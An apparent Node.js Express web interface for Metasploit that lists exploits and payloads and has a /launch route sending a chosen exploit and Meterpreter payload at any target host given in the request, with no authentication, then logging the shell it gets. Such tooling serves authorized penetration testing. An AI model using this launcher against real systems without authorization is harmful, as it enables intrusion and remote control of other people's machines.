var config = require('./config.js'),

		express = require('express'),
		ejs 		= require('ejs'),
		async 	= require('async'),
		msfjs 	= require('msfjs')({
			path: config.metasploitpath 
		});

var app = express();

// Configure app

app.use(express.bodyParser());
app.use(express.static('files/public'));
app.set('views', 'files/views');
app.use(app.router);

// Routes

app.get('/', function(request, response) {

	response.render('index.ejs', {
		layout: false,
		exploits: msfjs.Exploits.exploits,
		payloads: msfjs.Payloads.payloads
	});

});

app.get('/exploits', function(request, response) {

	response.render('exploits.ejs', {
		layout: false,
		exploits: msfjs.Exploits.exploits
	});
	
});

app.get('/sessions', function(request, response) {

	response.render('sessions.ejs', {
		layout: false,
		sessions: msfjs.Metasploit.sessions
	});

});

app.get('/sessions/:session', function(request, response) {

	response.end("Not implemented yet, sorry!");

});

app.get('/payloads', function(request, response) {

	response.render('payloads.ejs', {
		layout: false,
		payloads: msfjs.Payloads.payloads
	});

});

app.get('/launch', function(request, response) {

	response.render('launch.ejs', {
		layout: false,
		options: request.query
	});

});

app.post('/launch', function(request, response) {

	var options = {};

	var exploit = request.body.exploit,
			payload = request.body.payload,
			target  = request.body.target;

	options.rhost = target;

	if(request.body.options) {

		request.body.options.forEach(function(option) {
			options[option.key] = option.value;
		});

	}

	console.log("Launching " + payload + " at " + target + " using " + exploit);
	
	var exploit = new msfjs.Meterpreter(exploit, options);

	msfjs.Exploits.launch(exploit, function(status) {

		response.end();

		status.on("success", function(session) {

			console.log("Got meterpreter shell on " + session.connection.to.host);

		});

		status.on("error", function(error) {
			console.error(error);
		});

	});

});

app.listen(config.server.port, config.server.host, function() {
	console.log("Listening on " + [ config.server.host, config.server.port ].join(":"));
});